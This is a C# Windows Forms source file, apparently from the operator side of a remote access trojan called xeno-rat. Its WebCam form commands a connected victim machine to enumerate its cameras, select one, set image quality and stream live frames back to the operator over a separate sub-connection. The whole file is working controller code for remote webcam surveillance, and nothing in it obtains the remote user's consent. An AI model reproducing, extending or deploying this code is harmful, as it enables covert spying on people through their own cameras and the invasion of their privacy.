using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class WebCam : Form
    {
        Node client;
        Node ImageNode;
        bool playing = false;
        string[] Cameras;
        string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        public WebCam(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualitys);
            InitializeAsync();
        }
        private async Task InitializeAsync() 
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshCams();
            RecvThread();
        }
        public async Task RecvThread()
        {
            while (ImageNode.Connected())
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {

                        Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = Image.FromStream(ms);
                        }
                        pictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (pictureBox1.Image != null)
                            {
                                pictureBox1.Image.Dispose();
                                pictureBox1.Image = null;
                            }
                            pictureBox1.Image = image;
                        }));
                    }
                    catch { }
                    //update picturebox
                }
            }
        }
        public async Task RefreshCams()
        {
            string[] mics = await GetCamera();

            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(mics);
            if (mics.Length == 0)
            {
                button2.Enabled = false;
            }
            else
            {
                button2.Enabled = true;
                await SetCamera(0);
            }
        }
        public async Task SetCamera(int index)
        {
            byte[] opcode = new byte[] { 1 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(index));
        }
        public async Task SetQuality(int quality)
        {
            byte[] opcode = new byte[] { 5 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(quality));
        }
        public async Task<string[]> GetCamera()
        {
            byte[] opcode = new byte[] { 0 };
            await client.SendAsync(opcode);
            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[mics];
            for (int i = 0; i < mics; i++)
            {
                result[i] = Encoding.UTF8.GetString(await client.ReceiveAsync());
            }
            Cameras = result;
            return result;
        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            await client.SendAsync(new byte[] { 4 });
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }
        private void WebCam_Load(object sender, EventArgs e)
        {

        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false;//start
            button1.Enabled = false;
            //player.Start();
            await client.SendAsync(new byte[] { 2 });
            playing = true;
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false;//stop
            button1.Enabled = true;
            //player.Stop();
            await client.SendAsync(new byte[] { 3 });
            playing = false;
            if (pictureBox1.Image != null)
            {
                pictureBox1.Image.Dispose();
                pictureBox1.Image = null;
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshCams();
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetCamera(selectedIndex);
            }
        }

        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
            }
        }
    }
}
